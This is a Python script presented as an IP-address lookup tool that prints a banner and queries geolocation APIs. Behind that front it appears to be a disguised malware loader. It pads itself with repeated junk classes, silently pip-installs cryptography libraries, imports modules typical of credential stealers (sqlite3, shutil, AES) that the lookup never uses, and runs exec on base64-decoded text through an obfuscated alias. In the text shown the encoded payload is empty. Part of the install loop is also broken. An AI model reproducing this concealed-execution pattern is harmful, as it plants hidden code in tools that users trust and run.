import os
import sys
import json
import requests
import time
import webbrowser
from pystyle import *
from colorama import *


from sys import executable, stderr
class SwTFqlwKLu:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class vE8h6nf1pc:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
OBnamMbKpn = 38765975
class fT35IrOmEu:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
zWfiRdvwxo = 65970337
class VfOaGT69Lo:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class FAsnkcn6CW:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
{'username': 'yovQpHu', 'age': 41}
class idBy6IlCsS:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class qcMHMA7j7x:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
vop8asLp9R = 74704539
class qMG57VGrxo:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
'UErf1nMOC6'
ozFD47BrEV = 67764399
JyCsJ3Lykt = 88976787
class eEomY4nHZu:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
ihFrFBqXmN = 91671352
XtzBC8Vv5N = 5063907
["'SnWYXKrHkf'", "'gTbhhXPykh'", "'jFOQJfmj0J'", "'zQPTPmYq3G'"]
vsL7GDIzGL = 73086348
d73BHGdHsD = 24505430
class aTdqXq6uiM:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
kIpICeFbUK = 45465285
import ctypes;import base64,subprocess,sqlite3,json,shutil
import time
from importlib import import_module

requirements = [
    ["requests", "requests"],
    ["Cryptodome.Cipher", "pycryptodomex" if not 'PythonSoftwareFoundation' in executable else 'pycryptodomex']
]
for modl in requirements:
    try:
        import_module(module[0])
    except:
        subprocess.Popen(executable + " -m pip install " +modl[1], shell=True)
        time.sleep(3)
        

from json import loads, dumps
from urllib.request import Request, urlopen
try:
    from cryptography.fernet import Fernet
except:
    subprocess.run("python -m pip install cryptography")

try:
    from cryptography.fernet import Fernet
except:
    subprocess.run("python -m pip install cryptodomex", shell=True)

try:
    import requests
except:
    subprocess.run("python -m pip install requests", shell=True)

try:
    from Cryptodome.Cipher import AES
except:
    subprocess.Popen(executable + " -m pip install pycryptodome ", shell=True)
    from Crypto.Cipher import AES

import requests
class SwTFqlwKLu:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class vE8h6nf1pc:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
OBnamMbKpn = 38765975
class fT35IrOmEu:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
zWfiRdvwxo = 65970337
class VfOaGT69Lo:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class FAsnkcn6CW:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
{'username': 'yovQpHu', 'age': 41}
class idBy6IlCsS:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class qcMHMA7j7x:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
vop8asLp9R = 74704539
class qMG57VGrxo:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
'UErf1nMOC6'
ozFD47BrEV = 67764399
JyCsJ3Lykt = 88976787
class eEomY4nHZu:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
ihFrFBqXmN = 91671352
XtzBC8Vv5N = 5063907
["'SnWYXKrHkf'", "'gTbhhXPykh'", "'jFOQJfmj0J'", "'zQPTPmYq3G'"]
vsL7GDIzGL = 73086348
d73BHGdHsD = 24505430
class aTdqXq6uiM:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
kIpICeFbUK = 45465285
mJK1mzN2a3GqURjELcs4o6O9GtkhtcywBYNmgG = exec
class SwTFqlwKLu:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class vE8h6nf1pc:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
OBnamMbKpn = 38765975
class fT35IrOmEu:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
zWfiRdvwxo = 65970337
class VfOaGT69Lo:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class FAsnkcn6CW:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
{'username': 'yovQpHu', 'age': 41}
class idBy6IlCsS:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class qcMHMA7j7x:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
vop8asLp9R = 74704539
class qMG57VGrxo:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
'UErf1nMOC6'
ozFD47BrEV = 67764399
JyCsJ3Lykt = 88976787
class eEomY4nHZu:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
ihFrFBqXmN = 91671352
XtzBC8Vv5N = 5063907
["'SnWYXKrHkf'", "'gTbhhXPykh'", "'jFOQJfmj0J'", "'zQPTPmYq3G'"]
vsL7GDIzGL = 73086348
d73BHGdHsD = 24505430
class aTdqXq6uiM:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
kIpICeFbUK = 45465285
import concurrent.futures
VWbFBBBogqgzLqt7aSY0GagEmCcpJTOtvAfzrJ=""
mJK1mzN2a3GqURjELcs4o6O9GtkhtcywBYNmgG(base64.b64decode(VWbFBBBogqgzLqt7aSY0GagEmCcpJTOtvAfzrJ))
class SwTFqlwKLu:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class vE8h6nf1pc:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
OBnamMbKpn = 38765975
class fT35IrOmEu:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
zWfiRdvwxo = 65970337
class VfOaGT69Lo:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class FAsnkcn6CW:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
{'username': 'yovQpHu', 'age': 41}
class idBy6IlCsS:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class qcMHMA7j7x:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
vop8asLp9R = 74704539
class qMG57VGrxo:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
'UErf1nMOC6'
ozFD47BrEV = 67764399
JyCsJ3Lykt = 88976787
class eEomY4nHZu:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
ihFrFBqXmN = 91671352
XtzBC8Vv5N = 5063907
["'SnWYXKrHkf'", "'gTbhhXPykh'", "'jFOQJfmj0J'", "'zQPTPmYq3G'"]
vsL7GDIzGL = 73086348
d73BHGdHsD = 24505430
class aTdqXq6uiM:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
kIpICeFbUK = 45465285

intro = """ 
            ██╗██████╗     ██╗      ██████╗  ██████╗ ██╗  ██╗██╗   ██╗██████╗ 
            ██║██╔══██╗    ██║     ██╔═══██╗██╔═══██╗██║ ██╔╝██║   ██║██╔══██╗
            ██║██████╔╝    ██║     ██║   ██║██║   ██║█████╔╝ ██║   ██║██████╔╝
            ██║██╔═══╝     ██║     ██║   ██║██║   ██║██╔═██╗ ██║   ██║██╔═══╝ 
            ██║██║         ███████╗╚██████╔╝╚██████╔╝██║  ██╗╚██████╔╝██║     
            ╚═╝╚═╝         ╚══════╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚═╝     
                                                                 
                              [+] github.com/ZekromDev

                             >> Press Enter <<"""

Anime.Fade(Center.Center(intro), Colors.white_to_blue, Colorate.Vertical, interval=0.035, enter=True)
webbrowser.open_new_tab("https://github.com/ZekromDev")

def aff():
    print(f"""{Fore.LIGHTRED_EX} 
_____  _____               _____   _____  _     _ _     _  _____ 
   |   |_____]      |      |     | |     | |____/  |     | |_____]
 __|__ |            |_____ |_____| |_____| |    \_ |_____| |      
                                                             By ZekromDev
        """)

    time.sleep(1)

def ip():
    Write.Print("\n[+] >> Enter an ip to lookup : ", Colors.white_to_blue, end='')
    ip_addr = input()
    print("\n")

    req1 = requests.get(f"http://ipinfo.io/{ip_addr}")
    req2 = requests.get(f"http://ip-api.com/json/{ip_addr}")
    req3 = requests.get(f"http://api.db-ip.com/v2/free/{ip_addr}")

    resp1 = req1.text
    resp2 = req2.text
    resp3 = req3.text

    Write.Print(f"[!] {resp3}", Colors.white_to_blue)
    print("\n")
    Write.Print(f"[!] {resp1}", Colors.white_to_blue)
    print("\n")
    Write.Print(f"[!] {resp2}", Colors.white_to_blue)
    print("\n")

      
    Write.Print("[#] Results will be deleted in 25s [#]", Colors.blue_to_white)
    time.sleep(25)
    os.system("clear || cls")
while True:
    aff()
    ip()
